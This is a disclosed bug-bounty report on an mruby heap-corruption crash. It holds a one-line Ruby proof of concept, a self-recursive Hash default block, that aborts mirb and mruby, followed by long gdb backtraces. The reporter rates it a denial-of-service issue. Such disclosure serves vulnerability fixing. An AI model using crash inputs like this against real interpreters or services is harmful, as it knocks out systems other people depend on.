# SIGABRT - mrb_realloc_simple - gc.c - line:201

## Report Details
- **Report ID**: 198452
- **URL**: https://hackerone.com/reports/198452
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-01-14T20:24:07.430Z
- **Disclosed**: 2017-03-29T23:30:24.130Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Explain
------------------
I downloaded "mruby-master" on 14/01/2017.

PoC
-------------------

The following code triggers the bug (attached as memory_corruption.rb):

	d b = Hash.new {|s,k| s[k] }[1]

Crash - mirb - mruby
-------------------

	x@x:~/Desktop/research/mruby/bin$ ./mirb memory_corruption.rb 
	mirb - Embeddable Interactive Ruby Shell

	*** Error in `./mirb': realloc(): invalid next size: 0x0000000000ecc250 ***
	Aborted (core dumped)
	x@x:~/Desktop/research/mruby/bin$ ./mruby memory_corruption.rb 
	*** Error in `./mruby': realloc(): invalid next size: 0x0000000002204400 ***
	Aborted (core dumped)

Debug - mirb
--------------------

	x@x:~/Desktop/research/mruby/bin$ gdb -q ./mirb
	Reading symbols from ./mirb...done.
	(gdb) r memory_corruption.rb 
	Starting program: /home/x/Desktop/research/mruby/bin/mirb memory_corruption.rb
	mirb - Embeddable Interactive Ruby Shell

	*** Error in `/home/x/Desktop/research/mruby/bin/mirb': realloc(): invalid next size: 0x000000000070d250 ***

	Program received signal SIGABRT, Aborted.
	0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
	(gdb) bt
	#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	#1  0x00007ffff7748388 in __GI_abort () at abort.c:89
	#2  0x00007ffff77821d4 in __libc_message (do_abort=do_abort@entry=1, fmt=fmt@entry=0x7ffff7890a10 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
	#3  0x00007ffff778cf37 in malloc_printerr (action=<optimized out>, str=0x7ffff788cc07 "realloc(): invalid next size", ptr=<optimized out>) at malloc.c:4996
	#4  0x00007ffff7790777 in _int_realloc (av=<optimized out>, oldp=0x70d240, oldsize=<optimized out>, nb=<optimized out>) at malloc.c:4234
	#5  0x00007ffff7791e09 in __GI___libc_realloc (oldmem=0x70d250, bytes=10240) at malloc.c:3029
	#6  0x00000000004293b8 in mrb_default_allocf (mrb=0x6ad010, p=0x70d250, size=10240, ud=0x0) at /home/x/Desktop/research/mruby/src/state.c:60
	#7  0x0000000000431615 in mrb_realloc_simple (mrb=0x6ad010, p=0x70d250, len=10240) at /home/x/Desktop/research/mruby/src/gc.c:201
	#8  0x0000000000431697 in mrb_realloc (mrb=0x6ad010, p=0x70d250, len=10240) at /home/x/Desktop/research/mruby/src/gc.c:215
	#9  0x00000000004063d8 in stack_extend_alloc (mrb=0x6ad010, room=7, keep=4) at /home/x/Desktop/research/mruby/src/vm.c:155
	#10 0x00000000004064de in stack_extend (mrb=0x6ad010, room=7, keep=4) at /home/x/Desktop/research/mruby/src/vm.c:172
	#11 0x000000000040a3c3 in mrb_vm_exec (mrb=0x6ad010, proc=0x6b01b0, pc=0x6ac540 <call_iseq>) at /home/x/Desktop/research/mruby/src/vm.c:1290
	#12 0x0000000000408231 in mrb_vm_run (mrb=0x6ad010, proc=0x6b75c0, self=..., stack_keep=4) at /home/x/Desktop/research/mruby/src/vm.c:789
	#13 0x0000000000410242 in mrb_run (mrb=0x6ad010, proc=0x6b75c0, self=...) at /home/x/Desktop/research/mruby/src/vm.c:2502
	#14 0x000000000040740e in mrb_funcall_with_block (mrb=0x6ad010, self=..., mid=117, argc=2, argv=0x7ffffffcc360, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:432
	#15 0x00000000004074ad in mrb_funcall_argv (mrb=0x6ad010, self=..., mid=117, argc=2, argv=0x7ffffffcc360) at /home/x/Desktop/research/mruby/src/vm.c:442
	#16 0x0000000000406bdd in mrb_funcall (mrb=0x6ad010, self=..., name=0x46c8ca "call", argc=2) at /home/x/Desktop/research/mruby/src/vm.c:323
	#17 0x0000000000422f88 in mrb_hash_default (mrb=0x6ad010, hash=...) at /home/x/Desktop/research/mruby/src/hash.c:401
	#18 0x0000000000407381 in mrb_funcall_with_block (mrb=0x6ad010, self=..., mid=166, argc=1, argv=0x7ffffffcc7e0, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:425
	#19 0x00000000004074ad in mrb_funcall_argv (mrb=0x6ad010, self=..., mid=166, argc=1, argv=0x7ffffffcc7e0) at /home/x/Desktop/research/mruby/src/vm.c:442
	#20 0x0000000000406bdd in mrb_funcall (mrb=0x6ad010, self=..., name=0x46c855 "default", argc=1) at /home/x/Desktop/research/mruby/src/vm.c:323
	#21 0x000000000042272c in mrb_hash_get (mrb=0x6ad010, hash=..., key=...) at /home/x/Desktop/research/mruby/src/hash.c:176
	#22 0x0000000000422e99 in mrb_hash_aget (mrb=0x6ad010, self=...) at /home/x/Desktop/research/mruby/src/hash.c:366
	#23 0x0000000000409d7b in mrb_vm_exec (mrb=0x6ad010, proc=0x6b01b0, pc=0x71b2ec) at /home/x/Desktop/research/mruby/src/vm.c:1191
	#24 0x0000000000408231 in mrb_vm_run (mrb=0x6ad010, proc=0x6b75c0, self=..., stack_keep=4) at /home/x/Desktop/research/mruby/src/vm.c:789
	#25 0x0000000000410242 in mrb_run (mrb=0x6ad010, proc=0x6b75c0, self=...) at /home/x/Desktop/research/mruby/src/vm.c:2502
	#26 0x000000000040740e in mrb_funcall_with_block (mrb=0x6ad010, self=..., mid=117, argc=2, argv=0x7ffffffcd2a0, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:432
	#27 0x00000000004074ad in mrb_funcall_argv (mrb=0x6ad010, self=..., mid=117, argc=2, argv=0x7ffffffcd2a0) at /home/x/Desktop/research/mruby/src/vm.c:442
	#28 0x0000000000406bdd in mrb_funcall (mrb=0x6ad010, self=..., name=0x46c8ca "call", argc=2) at /home/x/Desktop/research/mruby/src/vm.c:323
	#29 0x0000000000422f88 in mrb_hash_default (mrb=0x6ad010, hash=...) at /home/x/Desktop/research/mruby/src/hash.c:401
	#30 0x0000000000407381 in mrb_funcall_with_block (mrb=0x6ad010, self=..., mid=166, argc=1, argv=0x7ffffffcd720, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:425
	#31 0x00000000004074ad in mrb_funcall_argv (mrb=0x6ad010, self=..., mid=166, argc=1, argv=0x7ffffffcd720) at /home/x/Desktop/research/mruby/src/vm.c:442
	#32 0x0000000000406bdd in mrb_funcall (mrb=0x6ad010, self=..., name=0x46c855 "default", argc=1) at /home/x/Desktop/research/mruby/src/vm.c:323
	#33 0x000000000042272c in mrb_hash_get (mrb=0x6ad010, hash=..., key=...) at /home/x/Desktop/research/mruby/src/hash.c:176
	#34 0x0000000000422e99 in mrb_hash_aget (mrb=0x6ad010, self=...) at /home/x/Desktop/research/mruby/src/hash.c:366
	#35 0x0000000000409d7b in mrb_vm_exec (mrb=0x6ad010, proc=0x6b01b0, pc=0x71b2ec) at /home/x/Desktop/research/mruby/src/vm.c:1191
	#36 0x0000000000408231 in mrb_vm_run (mrb=0x6ad010, proc=0x6b75c0, self=..., stack_keep=4) at /home/x/Desktop/research/mruby/src/vm.c:789
	#37 0x0000000000410242 in mrb_run (mrb=0x6ad010, proc=0x6b75c0, self=...) at /home/x/Desktop/research/mruby/src/vm.c:2502
	#38 0x000000000040740e in mrb_funcall_with_block (mrb=0x6ad010, self=..., mid=117, argc=2, argv=0x7ffffffce1e0, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:432
	#39 0x00000000004074ad in mrb_funcall_argv (mrb=0x6ad010, self=..., mid=117, argc=2, argv=0x7ffffffce1e0) at /home/x/Desktop/research/mruby/src/vm.c:442
	#40 0x0000000000406bdd in mrb_funcall (mrb=0x6ad010, self=..., name=0x46c8ca "call", argc=2) at /home/x/Desktop/research/mruby/src/vm.c:323
	#41 0x0000000000422f88 in mrb_hash_default (mrb=0x6ad010, hash=...) at /home/x/Desktop/research/mruby/src/hash.c:401
	#42 0x0000000000407381 in mrb_funcall_with_block (mrb=0x6ad010, self=..., mid=166, argc=1, argv=0x7ffffffce660, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:425
	#43 0x00000000004074ad in mrb_funcall_argv (mrb=0x6ad010, self=..., mid=166, argc=1, argv=0x7ffffffce660) at /home/x/Desktop/research/mruby/src/vm.c:442
	#44 0x0000000000406bdd in mrb_funcall (mrb=0x6ad010, self=..., name=0x46c855 "default", argc=1) at /home/x/Desktop/research/mruby/src/vm.c:323
	#45 0x000000000042272c in mrb_hash_get (mrb=0x6ad010, hash=..., key=...) at /home/x/Desktop/research/mruby/src/hash.c:176
	#46 0x0000000000422e99 in mrb_hash_aget (mrb=0x6ad010, self=...) at /home/x/Desktop/research/mruby/src/hash.c:366
	#47 0x0000000000409d7b in mrb_vm_exec (mrb=0x6ad010, proc=0x6b01b0, pc=0x71b2ec) at /home/x/Desktop/research/mruby/src/vm.c:1191
	#48 0x0000000000408231 in mrb_vm_run (mrb=0x6ad010, proc=0x6b75c0, self=..., stack_keep=4) at /home/x/Desktop/research/mruby/src/vm.c:789
	#49 0x0000000000410242 in mrb_run (mrb=0x6ad010, proc=0x6b75c0, self=...) at /home/x/Desktop/research/mruby/src/vm.c:2502
	---Type <return> to continue, or q <return> to quit---q
	Quit

Debug - mruby
--------------------

	(gdb) r memory_corruption.rb 
	The program being debugged has been started already.
	Start it from the beginning? (y or n) y
	Starting program: /home/x/Desktop/research/mruby/bin/mruby memory_corruption.rb
	*** Error in `/home/x/Desktop/research/mruby/bin/mruby': realloc(): invalid next size: 0x0000000000709400 ***

	Program received signal SIGABRT, Aborted.
	0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
	(gdb) bt
	#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	#1  0x00007ffff7748388 in __GI_abort () at abort.c:89
	#2  0x00007ffff77821d4 in __libc_message (do_abort=do_abort@entry=1, fmt=fmt@entry=0x7ffff7890a10 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
	#3  0x00007ffff778cf37 in malloc_printerr (action=<optimized out>, str=0x7ffff788cc07 "realloc(): invalid next size", ptr=<optimized out>) at malloc.c:4996
	#4  0x00007ffff7790777 in _int_realloc (av=<optimized out>, oldp=0x7093f0, oldsize=<optimized out>, nb=<optimized out>) at malloc.c:4234
	#5  0x00007ffff7791e09 in __GI___libc_realloc (oldmem=0x709400, bytes=10240) at malloc.c:3029
	#6  0x000000000042673f in mrb_default_allocf (mrb=0x6ad010, p=0x709400, size=10240, ud=0x0) at /home/x/Desktop/research/mruby/src/state.c:60
	#7  0x000000000042e99c in mrb_realloc_simple (mrb=0x6ad010, p=0x709400, len=10240) at /home/x/Desktop/research/mruby/src/gc.c:201
	#8  0x000000000042ea1e in mrb_realloc (mrb=0x6ad010, p=0x709400, len=10240) at /home/x/Desktop/research/mruby/src/gc.c:215
	#9  0x00000000004062cf in stack_extend_alloc (mrb=0x6ad010, room=7, keep=4) at /home/x/Desktop/research/mruby/src/vm.c:155
	#10 0x00000000004063d5 in stack_extend (mrb=0x6ad010, room=7, keep=4) at /home/x/Desktop/research/mruby/src/vm.c:172
	#11 0x000000000040a2ba in mrb_vm_exec (mrb=0x6ad010, proc=0x6b0180, pc=0x6ac500 <call_iseq>) at /home/x/Desktop/research/mruby/src/vm.c:1290
	#12 0x0000000000408128 in mrb_vm_run (mrb=0x6ad010, proc=0x6b75c0, self=..., stack_keep=4) at /home/x/Desktop/research/mruby/src/vm.c:789
	#13 0x0000000000410139 in mrb_run (mrb=0x6ad010, proc=0x6b75c0, self=...) at /home/x/Desktop/research/mruby/src/vm.c:2502
	#14 0x0000000000407305 in mrb_funcall_with_block (mrb=0x6ad010, self=..., mid=117, argc=2, argv=0x7ffffffcd490, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:432
	#15 0x00000000004073a4 in mrb_funcall_argv (mrb=0x6ad010, self=..., mid=117, argc=2, argv=0x7ffffffcd490) at /home/x/Desktop/research/mruby/src/vm.c:442
	#16 0x0000000000406ad4 in mrb_funcall (mrb=0x6ad010, self=..., name=0x46bc4a "call", argc=2) at /home/x/Desktop/research/mruby/src/vm.c:323
	#17 0x000000000042030f in mrb_hash_default (mrb=0x6ad010, hash=...) at /home/x/Desktop/research/mruby/src/hash.c:401
	#18 0x0000000000407278 in mrb_funcall_with_block (mrb=0x6ad010, self=..., mid=166, argc=1, argv=0x7ffffffcd910, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:425
	#19 0x00000000004073a4 in mrb_funcall_argv (mrb=0x6ad010, self=..., mid=166, argc=1, argv=0x7ffffffcd910) at /home/x/Desktop/research/mruby/src/vm.c:442
	#20 0x0000000000406ad4 in mrb_funcall (mrb=0x6ad010, self=..., name=0x46bbd5 "default", argc=1) at /home/x/Desktop/research/mruby/src/vm.c:323
	#21 0x000000000041fab3 in mrb_hash_get (mrb=0x6ad010, hash=..., key=...) at /home/x/Desktop/research/mruby/src/hash.c:176
	#22 0x0000000000420220 in mrb_hash_aget (mrb=0x6ad010, self=...) at /home/x/Desktop/research/mruby/src/hash.c:366
	#23 0x0000000000409c72 in mrb_vm_exec (mrb=0x6ad010, proc=0x6b0180, pc=0x71b3cc) at /home/x/Desktop/research/mruby/src/vm.c:1191
	#24 0x0000000000408128 in mrb_vm_run (mrb=0x6ad010, proc=0x6b75c0, self=..., stack_keep=4) at /home/x/Desktop/research/mruby/src/vm.c:789
	#25 0x0000000000410139 in mrb_run (mrb=0x6ad010, proc=0x6b75c0, self=...) at /home/x/Desktop/research/mruby/src/vm.c:2502
	#26 0x0000000000407305 in mrb_funcall_with_block (mrb=0x6ad010, self=..., mid=117, argc=2, argv=0x7ffffffce3d0, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:432
	#27 0x00000000004073a4 in mrb_funcall_argv (mrb=0x6ad010, self=..., mid=117, argc=2, argv=0x7ffffffce3d0) at /home/x/Desktop/research/mruby/src/vm.c:442
	#28 0x0000000000406ad4 in mrb_funcall (mrb=0x6ad010, self=..., name=0x46bc4a "call", argc=2) at /home/x/Desktop/research/mruby/src/vm.c:323
	#29 0x000000000042030f in mrb_hash_default (mrb=0x6ad010, hash=...) at /home/x/Desktop/research/mruby/src/hash.c:401
	#30 0x0000000000407278 in mrb_funcall_with_block (mrb=0x6ad010, self=..., mid=166, argc=1, argv=0x7ffffffce850, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:425
	#31 0x00000000004073a4 in mrb_funcall_argv (mrb=0x6ad010, self=..., mid=166, argc=1, argv=0x7ffffffce850) at /home/x/Desktop/research/mruby/src/vm.c:442
	#32 0x0000000000406ad4 in mrb_funcall (mrb=0x6ad010, self=..., name=0x46bbd5 "default", argc=1) at /home/x/Desktop/research/mruby/src/vm.c:323
	#33 0x000000000041fab3 in mrb_hash_get (mrb=0x6ad010, hash=..., key=...) at /home/x/Desktop/research/mruby/src/hash.c:176
	#34 0x0000000000420220 in mrb_hash_aget (mrb=0x6ad010, self=...) at /home/x/Desktop/research/mruby/src/hash.c:366
	#35 0x0000000000409c72 in mrb_vm_exec (mrb=0x6ad010, proc=0x6b0180, pc=0x71b3cc) at /home/x/Desktop/research/mruby/src/vm.c:1191
	#36 0x0000000000408128 in mrb_vm_run (mrb=0x6ad010, proc=0x6b75c0, self=..., stack_keep=4) at /home/x/Desktop/research/mruby/src/vm.c:789
	#37 0x0000000000410139 in mrb_run (mrb=0x6ad010, proc=0x6b75c0, self=...) at /home/x/Desktop/research/mruby/src/vm.c:2502
	#38 0x0000000000407305 in mrb_funcall_with_block (mrb=0x6ad010, self=..., mid=117, argc=2, argv=0x7ffffffcf310, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:432
	#39 0x00000000004073a4 in mrb_funcall_argv (mrb=0x6ad010, self=..., mid=117, argc=2, argv=0x7ffffffcf310) at /home/x/Desktop/research/mruby/src/vm.c:442
	#40 0x0000000000406ad4 in mrb_funcall (mrb=0x6ad010, self=..., name=0x46bc4a "call", argc=2) at /home/x/Desktop/research/mruby/src/vm.c:323
	#41 0x000000000042030f in mrb_hash_default (mrb=0x6ad010, hash=...) at /home/x/Desktop/research/mruby/src/hash.c:401
	#42 0x0000000000407278 in mrb_funcall_with_block (mrb=0x6ad010, self=..., mid=166, argc=1, argv=0x7ffffffcf790, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:425
	#43 0x00000000004073a4 in mrb_funcall_argv (mrb=0x6ad010, self=..., mid=166, argc=1, argv=0x7ffffffcf790) at /home/x/Desktop/research/mruby/src/vm.c:442
	#44 0x0000000000406ad4 in mrb_funcall (mrb=0x6ad010, self=..., name=0x46bbd5 "default", argc=1) at /home/x/Desktop/research/mruby/src/vm.c:323
	#45 0x000000000041fab3 in mrb_hash_get (mrb=0x6ad010, hash=..., key=...) at /home/x/Desktop/research/mruby/src/hash.c:176
	#46 0x0000000000420220 in mrb_hash_aget (mrb=0x6ad010, self=...) at /home/x/Desktop/research/mruby/src/hash.c:366
	#47 0x0000000000409c72 in mrb_vm_exec (mrb=0x6ad010, proc=0x6b0180, pc=0x71b3cc) at /home/x/Desktop/research/mruby/src/vm.c:1191
	#48 0x0000000000408128 in mrb_vm_run (mrb=0x6ad010, proc=0x6b75c0, self=..., stack_keep=4) at /home/x/Desktop/research/mruby/src/vm.c:789
	#49 0x0000000000410139 in mrb_run (mrb=0x6ad010, proc=0x6b75c0, self=...) at /home/x/Desktop/research/mruby/src/vm.c:2502
	---Type <return> to continue, or q <return> to quit---q
	Quit

Impact
--------------------

As far as I can see, it is not exploitable. But it can cause DoS.

## Attachments
- memory_corruption.rb
